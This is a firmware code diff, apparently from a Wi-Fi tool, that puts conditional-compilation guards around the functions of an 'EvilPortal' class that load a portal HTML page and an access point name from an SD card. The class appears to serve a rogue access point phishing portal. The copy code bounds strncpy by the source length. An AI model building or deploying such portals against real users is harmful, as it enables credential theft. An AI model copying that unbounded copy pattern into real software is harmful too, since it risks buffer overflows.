@@ -60,46 +60,56 @@ void EvilPortal::setupServer() {
 
 bool EvilPortal::setHtml() {
   Serial.println("Setting HTML...");
-  File html_file = sd_obj.getFile("/index.html");
-  if (!html_file) {
-    Serial.println("Could not open index.html. Exiting...");
-    return false;
-  }
-  else {
-    String html = "";
-    while (html_file.available()) {
-      char c = html_file.read();
-      if (isPrintable(c))
-        html.concat(c);
+  #ifndef WRITE_PACKETS_SERIAL
+    File html_file = sd_obj.getFile("/index.html");
+    if (!html_file) {
+      Serial.println("Could not open index.html. Exiting...");
+      return false;
     }
-    strncpy(this->index_html, html.c_str(), strlen(html.c_str()));
-    this->has_html = true;
-    Serial.println("html set");
-    html_file.close();
-    return true;
-  }
+    else {
+      String html = "";
+      while (html_file.available()) {
+        char c = html_file.read();
+        if (isPrintable(c))
+          html.concat(c);
+      }
+      strncpy(this->index_html, html.c_str(), strlen(html.c_str()));
+      this->has_html = true;
+      Serial.println("html set");
+      html_file.close();
+      return true;
+    }
+  #else
+    return false;
+  #endif
+
 }
 
 bool EvilPortal::setAP() {
-  File ap_config_file = sd_obj.getFile("/ap.config.txt");
-  if (!ap_config_file) {
-    Serial.println("Could not open ap.config.txt. Exiting...");
-    return false;
-  }
-  else {
-    String ap_config = "";
-    while (ap_config_file.available()) {
-      char c = ap_config_file.read();
-      Serial.print(c);
-      if (isPrintable(c))
-        ap_config.concat(c);
+  #ifndef WRITE_PACKETS_SERIAL
+    File ap_config_file = sd_obj.getFile("/ap.config.txt");
+    if (!ap_config_file) {
+      Serial.println("Could not open ap.config.txt. Exiting...");
+      return false;
     }
-    strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
-    this->has_ap = true;
-    Serial.println("ap config set");
-    ap_config_file.close();
-    return true;
-  }
+    else {
+      String ap_config = "";
+      while (ap_config_file.available()) {
+        char c = ap_config_file.read();
+        Serial.print(c);
+        if (isPrintable(c))
+          ap_config.concat(c);
+      }
+      strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
+      this->has_ap = true;
+      Serial.println("ap config set");
+      ap_config_file.close();
+      return true;
+    }
+  #else
+    return false;
+  #endif
+
 }
 
 void EvilPortal::startAP() {
